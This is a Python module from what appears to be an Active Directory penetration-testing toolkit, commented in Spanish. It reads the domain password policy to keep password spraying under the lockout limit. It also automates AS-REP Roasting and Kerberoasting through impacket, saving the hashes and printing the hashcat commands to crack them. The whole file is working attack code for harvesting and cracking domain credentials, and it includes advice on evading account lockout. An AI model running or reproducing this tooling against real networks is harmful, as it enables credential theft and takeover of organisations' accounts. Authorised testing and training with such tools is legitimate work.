"""
[10][11][12] Módulo de Active Directory avanzado:
  - Política de contraseñas (para no autobloquearte en un password spray)
  - AS-REP Roasting (usuarios sin preautenticación Kerberos)
  - Kerberoasting (tickets de servicio con SPN)

Requiere impacket (GetNPUsers.py / GetUserSPNs.py, o sus alias impacket-*).
"""
import os
import re
import shutil
from pathlib import Path
from ..core import (C, run, ask, ask_yes_no, print_status, _get_nxc_base, get_nxc_bin,
                     _secure_write, exportar_json)

GETNPUSERS_NOMBRES = ["impacket-GetNPUsers", "GetNPUsers.py", "getnpusers"]
GETUSERSPNS_NOMBRES = ["impacket-GetUserSPNs", "GetUserSPNs.py", "getuserspns"]


def _find_tool(nombres):
    for n in nombres:
        p = shutil.which(n)
        if p:
            return p
    return None


# ---------- [10] Política de contraseñas ----------

def enumerar_politica_passwords(ctx):
    print(f"\n{C.HEADER}=== [10] Política de Contraseñas ==={C.RESET}")
    if not get_nxc_bin():
        print_status("nxc/netexec no está instalado.", "error"); return
    if not ctx.has_ad or not ctx.dc_ip:
        print_status("Este módulo requiere AD y la IP del DC.", "warning"); return

    # Primero sin credenciales (SAMR a veces lo permite anónimo)
    salida = run(_get_nxc_base(ctx, [ctx.dc_ip], for_os=True) + ["--pass-pol"], ctx=ctx) or ""
    if "password length" not in salida.lower() and ctx.username:
        print_status("Sin sesión nula, reintentando con credenciales...", "info")
        salida = run(_get_nxc_base(ctx, [ctx.dc_ip]) + ["--pass-pol"], ctx=ctx) or ""

    campos = {}
    patrones = {
        "longitud_minima": r"Minimum password length:\s*(\d+)",
        "historial": r"Password history length:\s*(\d+)",
        "edad_maxima": r"Maximum password age:\s*([\w: .-]+)",
        "edad_minima": r"Minimum password age:\s*([\w: .-]+)",
        "umbral_bloqueo": r"(?:Account lockout threshold|Lockout threshold):\s*(\d+|None)",
        "duracion_bloqueo": r"(?:Account lockout duration|Lockout duration):\s*([\w: .-]+)",
        "ventana_observacion": r"(?:Reset account lockout|Lockout observation window):\s*([\w: .-]+)",
    }
    for clave, patron in patrones.items():
        m = re.search(patron, salida, re.I)
        if m:
            campos[clave] = m.group(1).strip()

    ctx.resultados["politica_contrasenas"] = campos
    if not campos:
        print_status("No se pudo leer la política (requiere sesión válida, nula o autenticada).", "warning")
    else:
        for k, v in campos.items():
            print(f"  {C.CYAN}{k}{C.RESET}: {C.YELLOW}{v}{C.RESET}")
        umbral = campos.get("umbral_bloqueo", "").lower()
        if umbral and umbral not in ("none", "0"):
            print_status(f"Umbral de bloqueo = {umbral}: si haces password spraying, "
                          f"limita los intentos por usuario a {umbral} menos 1.", "warning")
        else:
            print_status("Sin umbral de bloqueo detectado (o no se pudo leer). "
                          "Aun así, haz spraying con cuidado.", "info")

    exportar_json(ctx)


# ---------- [11] AS-REP Roasting ----------

def asrep_roast(ctx):
    print(f"\n{C.HEADER}=== [11] AS-REP Roasting ==={C.RESET}")
    tool = _find_tool(GETNPUSERS_NOMBRES)
    if not tool:
        print_status("impacket (GetNPUsers.py) no está instalado.", "error"); return
    if not ctx.has_ad or not ctx.dc_ip:
        print_status("Este módulo requiere AD y la IP del DC.", "warning"); return

    dominio = ctx.detectar_dominio() or ask("Nombre de dominio (ej: HTB.LOCAL)", "")
    if not dominio:
        print_status("Sin dominio no se puede continuar.", "error"); return

    if not ctx.resultados["usuarios"]:
        print_status("No hay usuarios enumerados. Ejecuta [3] primero, "
                      "o indica un usuario manual.", "warning")
        manual = ask("Usuario único a probar (vacío = cancelar)", "")
        if not manual:
            return
        usuarios = [manual]
    else:
        usuarios = ctx.resultados["usuarios"]

    users_file = ctx.outdir / "asrep_users.txt"
    _secure_write(users_file, "\n".join(usuarios))  # nace en 600: contiene nombres de cuentas de dominio
    outfile = ctx.outdir / "asrep_hashes.txt"

    if ctx.username and ctx.password:
        cred = f"{dominio}/{ctx.username}:{ctx.password}"
        cmd = [tool, cred, "-usersfile", str(users_file), "-dc-ip", ctx.dc_ip,
               "-format", "hashcat", "-outputfile", str(outfile)]
    else:
        cmd = [tool, f"{dominio}/", "-usersfile", str(users_file), "-no-pass",
               "-dc-ip", ctx.dc_ip, "-format", "hashcat", "-outputfile", str(outfile)]

    print_status(f"Probando {len(usuarios)} usuario(s) contra {ctx.dc_ip}...")
    salida = run(cmd, ctx=ctx, timeout=120) or ""

    # impacket crea outfile con los permisos por defecto del sistema (típicamente 644).
    # Contiene hashes crackeables: lo restringimos a solo el propietario.
    if outfile.exists():
        os.chmod(outfile, 0o600)

    vulnerables = re.findall(r"\$krb5asrep\$[^\s]+", salida)
    ctx.resultados["asrep_roast"] = {
        "usuarios_probados": len(usuarios),
        "vulnerables": len(vulnerables),
        "archivo_hashes": str(outfile) if outfile.exists() else None,
    }
    if vulnerables:
        print_status(f"¡{len(vulnerables)} usuario(s) vulnerable(s) a AS-REP Roasting! "
                      f"Hashes en: {outfile}", "success")
        print_status(f"Crackea con: hashcat -m 18200 {outfile} <wordlist>", "info")
    else:
        print_status("Ningún usuario vulnerable a AS-REP Roasting (o fallo de conexión).", "info")

    exportar_json(ctx)


# ---------- [12] Kerberoasting ----------

def kerberoast(ctx):
    print(f"\n{C.HEADER}=== [12] Kerberoasting ==={C.RESET}")
    tool = _find_tool(GETUSERSPNS_NOMBRES)
    if not tool:
        print_status("impacket (GetUserSPNs.py) no está instalado.", "error"); return
    if not ctx.has_ad or not ctx.dc_ip:
        print_status("Este módulo requiere AD y la IP del DC.", "warning"); return
    if not ctx.username or not ctx.password:
        print_status("Kerberoasting necesita credenciales válidas de dominio (usuario normal basta).", "error")
        return

    dominio = ctx.detectar_dominio() or ask("Nombre de dominio (ej: HTB.LOCAL)", "")
    if not dominio:
        print_status("Sin dominio no se puede continuar.", "error"); return

    outfile = ctx.outdir / "kerberoast_hashes.txt"
    cred = f"{dominio}/{ctx.username}:{ctx.password}"
    cmd = [tool, cred, "-dc-ip", ctx.dc_ip, "-request", "-outputfile", str(outfile)]

    if not ask_yes_no(f"¿Confirmas solicitar tickets de servicio como {ctx.username}@{dominio}?"):
        return

    print_status("Solicitando tickets de servicios con SPN...")
    salida = run(cmd, ctx=ctx, timeout=120) or ""

    if outfile.exists():
        os.chmod(outfile, 0o600)

    cuentas = re.findall(r"^(\S+)\s+\S+\s+\S+\s+\$krb5tgs\$", salida, re.M)
    hashes_encontrados = len(re.findall(r"\$krb5tgs\$", salida))

    ctx.resultados["kerberoast"] = {
        "hashes_obtenidos": hashes_encontrados,
        "cuentas": cuentas,
        "archivo_hashes": str(outfile) if outfile.exists() else None,
    }
    if hashes_encontrados:
        print_status(f"¡{hashes_encontrados} hash(es) TGS obtenidos! Guardados en: {outfile}", "success")
        print_status(f"Crackea con: hashcat -m 13100 {outfile} <wordlist>", "info")
    else:
        print_status("No se obtuvieron hashes (¿sin cuentas con SPN, o credenciales inválidas?).", "info")

    exportar_json(ctx)
